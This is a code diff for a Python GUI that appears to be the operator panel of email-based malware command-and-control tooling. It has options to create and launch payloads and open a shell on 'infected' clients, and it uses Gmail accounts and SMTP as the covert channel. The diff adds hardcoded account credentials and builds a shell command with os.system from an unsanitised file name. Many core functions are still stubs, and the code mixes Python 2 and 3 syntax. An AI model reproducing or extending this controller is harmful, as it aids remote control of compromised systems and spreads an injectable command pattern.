@@ -14,10 +14,10 @@ from requests import get
 
 external_ip = get('https://api.ipify.org').text
 
-server_username = 'PLACEHOLDER'
-server_password = 'PLACEHOLDER'
+server_username = 't.0.e.0.s.0.t.0.u.0.s.0.e.0.r.0@gmail.com'
+server_password = 'T3stUs3R*'
+test_account_name = "transaction.failed.0@gmail.com"
 
-sent_from = server_username
 
 currentDir = os.getcwd()
 
@@ -27,7 +27,7 @@ def populateAccounts(): #returns a dictionary of lists of accounts
   dirtyaccountList = open(currentDir + "/config/accountList", 'r+b').readlines()
   accounts= {}
   counter = 0
-  for account in dirtyaccountList[:-1]:
+  for account in dirtyaccountList:
     accounts[counter] = account.strip().split(':')
     accounts[counter].append("unknown")
     counter = counter + 1
@@ -36,7 +36,7 @@ def populateClients():
   dirtyClientList = open(currentDir + "/config/clientList", 'r+b').readlines()
   clients = {}
   counter = 0
-  for client in dirtyClientList[:-1]:
+  for client in dirtyClientList:
     clients[counter] = client.strip().split(":")
     clients[counter].append("unknown")
     counter = counter + 1
@@ -52,9 +52,8 @@ menu_def = [['&File', ['Edit Modules', 'Edit ProxyList', ]],
 
 mainLayout = [[sg.Menu(menu_def, tearoff=True)], [sg.Text("Account to send from:", size=(138, 1), justification="right")],
           [sg.Combo(["Create Payload", "Launch Payload", "Open shell", "Check Status of Clients",
-                     "Check Status of ProxyChains"], size=(100, 10), enable_events=False, readonly=True),
+                     "Check Status of ProxyChains","Single Account Checkup"], size=(100, 10), enable_events=False, readonly=True),
            sg.Listbox(values=(accounts.values()), size=(50, 20))],
-          #    [sg.Radio("Command String", "Create your own command to send", default=True, size=(30,2)),sg.Radio("Activate Module", "Use a predifined module on client", default=True, size=(30,2))],
           [sg.Button("Execute", size=(20, 2), button_color=["red", "black"])],
           [sg.Text("Notes", size=(120, 2)), sg.Text("Target Client", size=(15, 2))],
           [sg.Multiline(autoscroll=True, size=(100, 10), do_not_clear=True),
@@ -107,29 +106,58 @@ def startup():
 
 def main(ServerName): #main window layout for managing clients
   window = sg.Window(ServerName, mainLayout)
-  while True:
-    event, values = window.Read()
-    if event is None or event == 'Exit':
-      break
-    elif event == "Open Config":
-      fileName = openFileBox()
-    elif event == "Add Account":
-      addAccount()
-    elif event == "Add Client":
-      addClient()
-    elif event == "Add Module":
-      addModule()
-    elif event == "About":
-      help = open(currentDir + "/../../README.md", "r").read()
-      sg.PopupScrolled(help)
-    else:
-      print(event, values)
-
+  exit = 0
+  while not exit:
+    window = sg.Window(ServerName, mainLayout)
+    if not parseWindow(window):
+      exit = 1
+    window.Close()
+    pass
   window.Close()
   pass
 
-def parseWindow(windowType): #parses all buttons,checkboxes, etc. for the selected window
-  pass
+def parseWindow(window): #parses all buttons,checkboxes, etc. for the selected window
+  event, values = window.Read()
+  event, values = window.Read()
+  if event is None or event == "Exit":
+      return 0
+  elif event == "Open Config":
+    fileName = openFileBox()
+    os.system("gnome-terminal -e nano " + fileName)
+    return 1
+  elif event == "Add Account":
+    addAccount()
+    return 1
+  elif event == "Add Client":
+    addClient()
+    return 1
+  elif event == "Add Module":
+    addModule()
+    return 1
+  elif event == "About":
+    help = open(currentDir + "/../../README.md", "r").read()
+    sg.PopupScrolled(help)
+    return 1
+  else:
+    print event, values
+  
+  if event == "Execute":
+    if values[1] == "Checkup":
+      fullCheckup()
+      return 1
+    elif values[1] == "Single Account Checkup":
+      layoutSingleAccountCheckup = [[sg.Listbox(values=(accounts.values()), size=(50, 20))],
+                             [sg.Button("OK")]]
+      windowSingleAccountCheckup = sg.Window("Check on which account?", layoutSingleAccountCheckup)
+      eventSC, valuesSC = windowSingleAccountCheckup.Read()
+      #print valuesSC
+      #print valuesSC[0][0][0]
+      #print valuesSC[0][0][1]
+      singleAccount(valuesSC[0][0][0],valuesSC[0][0][1])
+    else:
+      print(event, values)
+  return 1
+
 def createConfig(): #create a config to bundle into payload to be loaded by the client
   pass
 def launchPayload(): #send the obfuscated and encrypted command payload, module, or config update to the client
@@ -139,12 +167,12 @@ def createPayload(): #create a command payload to be saved somewhere
 def status(): #keeps a live running update of whether the client is live or dead
   pass
 def fullCheckup(): #module used to essentially "ping" the client to check if it is alive or dead
+  
   pass
 def singleCheckup(): #check whether a single client is alive
   pass
 def singleAccount(accountName, accountPass): #Checks whether the account being sent to is alive or dead, by sending a "ping" from the account back to the server recieving account
-  mailSender(server_username, accountName, accountPass, "Test",'','')
-
+  mailSender(test_account_name, accountName, accountPass, "Test",'','')
   pass
 def readUpdate(): #client will send periodic updates of the infected system, this keeps track of it
   pass
@@ -188,25 +216,28 @@ def openFileBox():
               [sg.FileBrowse(target=(-1, 0)), sg.OK()]]
   window = sg.Window("Choose File", layout)
   event, values = window.Read()
-  return values
+  if event == "OK":
+    return values
+  else:
+    return 0
 def popUpError(ErrorMessage):
   sg.PopupError('PopupError')
   pass
-def mailSender(reUsers, seUser,sePass,subject,text,filenames): #the actual sending of the email is handled here, fragmenting and obfuscation done elsewhere
+def mailSender(reUser, seUser,sePass,subject,text,filenames): #the actual sending of the email is handled here, fragmenting and obfuscation done elsewhere
   email_text = """\
 From: %s
 To: %s
 Subject: %s
 
 %s
-""" % (seUser, ", ".join(reUsers), subject, text)
+""" % (seUser, reUser, subject, text)
 
   server = smtplib.SMTP('smtp.gmail.com', 587)
   server.ehlo()
   server.starttls()
 
   server.login(seUser, sePass)
-  server.sendmail(seUser, ", ".join(reUsers), email_text)
+  server.sendmail(seUser, reUser, email_text)
 def mailChecker(accountName, accountPass, serverName): #returns all recent emails received by the account from the main server
   pass
 
